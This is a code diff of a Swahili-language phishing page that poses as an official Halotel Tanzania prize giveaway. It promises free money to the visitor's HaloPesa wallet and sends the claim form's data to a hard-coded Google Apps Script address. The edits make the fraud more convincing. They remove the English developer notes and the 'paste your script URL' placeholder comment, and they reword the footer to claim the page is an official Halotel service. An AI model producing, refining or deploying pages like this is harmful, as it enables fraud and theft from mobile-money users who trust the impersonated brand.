@@ -3,18 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Halotel Tanzania - Tuzo Yako</title>
+    <title>Halotel Tanzania - Zawadi Yako</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-
         body {
             min-height: 100vh;
             display: flex; justify-content: center; align-items: center;
             padding: 20px;
-            /* Soft Halotel-green wash — rhymes with logo green */
             background: linear-gradient(160deg, #f1f8f4 0%, #d9f2e3 50%, #b8e6cc 100%);
         }
-
         .card {
             background: #ffffff;
             width: 100%; max-width: 390px;
@@ -27,8 +24,6 @@
             from { opacity: 0; transform: translateY(32px); }
             to   { opacity: 1; transform: translateY(0); }
         }
-
-        /* ── HEADER : mirrors logo's white base with green frame ── */
         .header {
             background: #ffffff;
             padding: 28px 20px 22px;
@@ -36,7 +31,6 @@
             border-bottom: 3px solid #00a651;
             position: relative;
         }
-        /* thin red accent strip — echoes logo red */
         .header::after {
             content: '';
             position: absolute;
@@ -45,7 +39,6 @@
             background: linear-gradient(90deg, #ed1c24 0%, #ed1c24 22%, transparent 22%, transparent 78%, #ed1c24 78%);
         }
         .header img { max-width: 150px; height: auto; display: block; margin: 0 auto; }
-
         .badge {
             display: inline-block;
             background: #00a651;
@@ -59,17 +52,10 @@
             text-transform: uppercase;
             box-shadow: 0 2px 8px rgba(0,166,81,0.3);
         }
-
         .content { padding: 28px 26px 26px; text-align: center; }
-
         h2 { color: #00552e; font-size: 24px; margin-bottom: 8px; font-weight: 700; }
-
-        .subtitle {
-            color: #4a5568; font-size: 14px; line-height: 1.65; margin-bottom: 20px;
-        }
+        .subtitle { color: #4a5568; font-size: 14px; line-height: 1.65; margin-bottom: 20px; }
         .subtitle strong { color: #007a3d; }
-
-        /* ── PRIZE BOX ── */
         .prize-box {
             background: linear-gradient(135deg, #f1f8f4 0%, #e4f4ea 100%);
             border: 2px dashed #00a651;
@@ -77,16 +63,8 @@
             padding: 18px 14px;
             margin-bottom: 24px;
         }
-        .prize-amount {
-            font-size: 32px; font-weight: 900; color: #007a3d;
-            letter-spacing: -0.5px;
-        }
-        .prize-label {
-            font-size: 11px; color: #6b7280; margin-top: 4px;
-            text-transform: uppercase; letter-spacing: 1.5px;
-        }
-
-        /* ── INPUTS : harmonised with logo green ── */
+        .prize-amount { font-size: 32px; font-weight: 900; color: #007a3d; letter-spacing: -0.5px; }
+        .prize-label { font-size: 11px; color: #6b7280; margin-top: 4px; text-transform: uppercase; letter-spacing: 1.5px; }
         .input-group {
             display: flex; align-items: center;
             margin-bottom: 14px;
@@ -116,8 +94,6 @@
             color: #1f2937;
         }
         input::placeholder { color: #9ca3af; }
-
-        /* ── BUTTON : Halotel green with subtle red bottom edge ── */
         .btn {
             background: linear-gradient(135deg, #00a651 0%, #007a3d 100%);
             color: #ffffff; border: none;
@@ -139,16 +115,9 @@
             background: #ed1c24;
             border-radius: 0 0 10px 10px;
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 22px rgba(0,166,81,0.45);
-        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 22px rgba(0,166,81,0.45); }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
-        .loader {
-            display: none; margin-top: 14px;
-            color: #007a3d; font-weight: 600; font-size: 13px;
-        }
+        .loader { display: none; margin-top: 14px; color: #007a3d; font-weight: 600; font-size: 13px; }
         .loader::before {
             content: '';
             display: inline-block;
@@ -161,21 +130,18 @@
             animation: spin 0.8s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         .footer {
             font-size: 11px; color: #9ca3af; margin-top: 22px;
             text-transform: uppercase; letter-spacing: 1.2px;
         }
-        .disclaimer {
-            font-size: 10px; color: #b0b6bd; margin-top: 8px; line-height: 1.4;
-        }
+        .disclaimer { font-size: 10px; color: #b0b6bd; margin-top: 8px; line-height: 1.4; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="header">
-        <!-- Upload your Halotel logo manually as logo.png -->
+        <!-- Weka logo yako ya Halotel hapa kama logo.png -->
         <img src="logo.png" alt="Halotel">
         <div class="badge">Rasmi 2026</div>
     </div>
@@ -206,13 +172,13 @@
 
         <div class="loader" id="status">Inathibitisha akaunti yako...</div>
 
-        <p class="footer">Imewekwa na Halotel Tanzania</p>
+        <p class="footer">Huduma Rasmi ya Halotel Tanzania</p>
         <p class="disclaimer">*Zawadi hii ni bure kabisa. Hakuna malipo yanayohitajika. Pesa zitawasili kwenye HaloPesa yako ndani ya dakika 10.</p>
     </div>
 </div>
 
 <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbzQD-o4cJe7odQVFtBb9yst1I90AkIGhesCQW1tL5Cjmp5Q0cjQ_qYg4EX1iWfZT_1JXg/exec'; // PASTE YOUR GOOGLE APPS SCRIPT URL HERE
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzQD-o4cJe7odQVFtBb9yst1I90AkIGhesCQW1tL5Cjmp5Q0cjQ_qYg4EX1iWfZT_1JXg/exec';
     const form = document.getElementById('claimForm');
     const btn = document.getElementById('submitBtn');
     const status = document.getElementById('status');
@@ -220,7 +186,7 @@
     form.addEventListener('submit', e => {
         e.preventDefault();
         btn.disabled = true;
-        btn.textContent = "INAPROSESWA...";
+        btn.textContent = "INASHUGHULIKIWA...";
         status.style.display = 'block';
 
         const formData = new FormData(form);
